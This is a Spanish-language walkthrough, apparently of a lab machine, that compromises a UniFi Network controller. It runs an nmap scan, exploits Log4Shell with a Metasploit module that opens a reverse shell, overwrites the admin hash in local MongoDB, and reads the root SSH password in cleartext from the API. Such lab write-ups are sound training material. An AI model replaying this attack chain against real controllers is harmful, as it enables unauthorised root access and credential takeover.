// 01

Reconocimiento y Log4Shell

1
RECONOCIMIENTO
NMAP
$ sudo nmap -sS -p- -n -Pn --min-rate 3000 --max-retries 1 --open 10.129.96.149
22/tcp open ssh
8080/tcp open http-proxy → /manage
8443/tcp open https-alt (UniFi Network)
8843/tcp open unknown
8880/tcp open cddbp-alt

// NOTA

Los puertos 8080/8443 con redirección a /manage son la huella de UniFi Network (Ubiquiti). El 27117 de MongoDB no aparece: solo escucha en localhost.

2
LOG4SHELL CON METASPLOIT

La versión del controlador apunta a CVE-2021-44228 (Log4Shell): el campo remember del login se registra con Log4j y evalúa ${jndi:...}.

METASPLOIT
$ sudo msfconsole -q -x "use exploit/multi/http/ubiquiti_unifi_log4shell; ..."
[+] The target is vulnerable.
[*] Command shell session 1 opened (10.10.16.12:4444 -> 10.129.96.149:50744)
uid=999(unifi) gid=999(unifi) groups=999(unifi)

// LOG4SHELL (CVE-2021-44228)

Dónde: UniFi Network 6.4.x embebe una versión de Log4j 2 vulnerable, que evalúa lookups ${jndi:ldap://...} en texto que registra.
Qué permite: el módulo de Metasploit levanta un servidor LDAP falso que sirve un objeto serializado y provoca RCE en el proceso de UniFi.

// OJO

El módulo necesita escuchar en el puerto 389 (privilegiado): hay que lanzar msfconsole con sudo, si no el servidor LDAP falso no levanta.

// 02

Shell unifi y MongoDB

3
USER FLAG
FLAG

[flag oculta]
4
LEER EL HASH DEL ADMIN EN MONGODB LOCAL
MONGO
unifi@unified:~$ mongo --port 27117 ace --eval 'db.admin.find().pretty()'
"name" : "administrator"
"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."

// NOTA

$6$ es un hash SHA-512 crypt. En vez de intentar romperlo, el propio acceso a la base de datos permite algo más directo: sobreescribirlo.

// 03

Reset del admin y SSH root

5
RESETEAR LA CONTRASEÑA DEL ADMINISTRADOR
MONGO UPDATE
$ HASH=$(openssl passwd -6 'Password123!')
unifi@unified:~$ mongo --port 27117 ace /tmp/u.js
# /tmp/u.js: db.admin.update({name:"administrator"},{$set:{x_shadow:"<HASH>"}})

// BASE DE DATOS SIN AISLAMIENTO

Dónde: MongoDB local (27117), accesible sin credenciales adicionales desde la shell de unifi.
Qué permite: modificar directamente el documento del administrador y fijar una contraseña propia, sin necesidad de crackear el hash original.

6
LOGIN A LA API Y CREDENCIALES SSH EN CLARO
PYTHON
$ python3 login_settings.py
"x_ssh_enabled": true,
"x_ssh_username": "root",
"x_ssh_password": "NotACrackablePassword4U2022"

// CREDENCIALES EN TEXTO CLARO

La configuración del controlador (rest/setting) devuelve la contraseña SSH de root sin cifrar, visible para cualquier cuenta de administrador — incluida la que acabamos de resetear.

Referencia Comandos

exploit/multi/http/ubiquiti_unifi_log4shell

Módulo de Metasploit que automatiza el Log4Shell contra UniFi Network: levanta el LDAP falso y entrega una shell.
mongo --port --eval
mongo --port 27117 base --eval 'consulta'
Ejecuta una consulta de Mongo Shell directamente desde la línea de comandos, sin entrar en modo interactivo.
openssl passwd -6
openssl passwd -6 'contraseña'
Genera un hash SHA-512 crypt (formato $6$), el mismo que usa UniFi en x_shadow.
API REST de UniFi
POST /api/login ; GET /api/s/default/rest/setting
Endpoints de autenticación y configuración del controlador; la sesión se mantiene por cookie.

// 05

Glosario

Log4Shell (CVE-2021-44228)
Vulnerabilidad crítica en Log4j 2 (versiones anteriores a 2.17.0): un texto registrado que contiene ${jndi:...} provoca una búsqueda remota que puede terminar en ejecución de código.
UniFi Network
Controlador de red de Ubiquiti para gestionar puntos de acceso, switches y routers. Corre como aplicación Java y usa MongoDB como almacén de configuración.
x_shadow
Campo de la colección admin en la base de datos de UniFi que guarda el hash de la contraseña del administrador del controlador.
SHA-512 crypt ($6$)
Formato de hash de contraseñas de Unix basado en SHA-512, identificable por el prefijo $6$. openssl passwd -6 genera hashes en este formato.
Secretos en configuración (plaintext credentials)
Antipatrón donde una aplicación guarda contraseñas sin cifrar en su configuración y las expone a cualquier cuenta con acceso administrativo a esa configuración.
